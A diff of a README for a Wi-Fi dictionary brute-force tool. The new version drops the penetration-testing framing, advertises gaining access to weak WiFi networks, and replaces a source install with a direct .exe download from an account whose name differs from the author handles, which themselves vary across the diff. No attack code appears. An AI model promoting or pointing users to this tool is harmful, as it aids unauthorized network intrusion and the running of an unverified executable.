@@ -1,28 +1,24 @@
-# WPFA - Wireless Penetration Framework Advanced
-## 📡 Advanced Wi-Fi Brute Force Tool
-### Dictionary-Based Attack Module
-
+#📡 WPFA - Tool Advanced Wi-Fi Brute Force
 ![Tool Preview](1.PNG)
-
 ## 📌 Overview
-WPFA is a professional-grade Wi-Fi security assessment tool developed by **pl7x3cut0r**. This module performs efficient dictionary-based brute force attacks for legitimate penetration testing purposes.
+WPFA is a Python-Based Tool Crafted by **v7x3cut0r** Built to Launch Brute Force Attacks On weak WiFi Networks and Exploit their vulnerabilities to Gain Access 👾
 
-Designed for security researchers and certified penetration testers to evaluate WPA/WPA2 network security.
-
-## ✨ Core Features
-- **Optimized Attack Engine**: Multi-threaded processing for efficient testing
-- **MAC-based Pattern Generation**: Smart password candidate generation
-- **Session Management**: Save and resume attack progress
-- **Network Analysis**: Detailed target network scanning
-- **Compatibility**: Supports most wireless network interfaces
-
+## ✨ Features
+- 🖥 Easy Terminal interface
+- 🔥 Save and resume Attack Progress
+- 🚀 Support For Networks that Rely on the MAC Address in the Password
+- 📶 Supports most wireless network interfaces
 ## 🛠️ Installation
-### Windows Executable:
-[![Download Executable](https://img.shields.io/badge/Download-WPFA_Stable-blue?style=for-the-badge&logo=windows)](https://github.com/pl7x3cut0r/wifi-bf-tool/releases/latest)
+<p align="left">
+  <a href="https://github.com/e7x3cut0r/WPFA/releases/download/v2.0/WBFA.exe">
+    <img src="https://img.shields.io/badge/Download-pl7x3cut0r-red?style=for-the-badge&logo=windows" alt="Download Button"/>
+  </a>  
+</p> 
 
-### From Source:
-```bash
-git clone https://github.com/pl7x3cut0r/wifi-bf-tool.git
-cd wifi-bf-tool
-pip install -r requirements.txt
-python wpfa.py
+## 📚 Documentation
+<div align="left">
+  <p>To view the user guide for the tool, read a detailed article on Medium:</p>
+  <a href="https://medium.com/@pl7x3cut0r/tool-advanced-wi-fi-brute-force-engine-dictionary-based-attack-5dfa9a567f2f" target="_blank">
+    <img src="https://img.shields.io/badge/📖_Read_on_Medium-12100E?style=for-the-badge&logo=medium&logoColor=white" alt="Medium Documentation"/>
+  </a>
+</div>
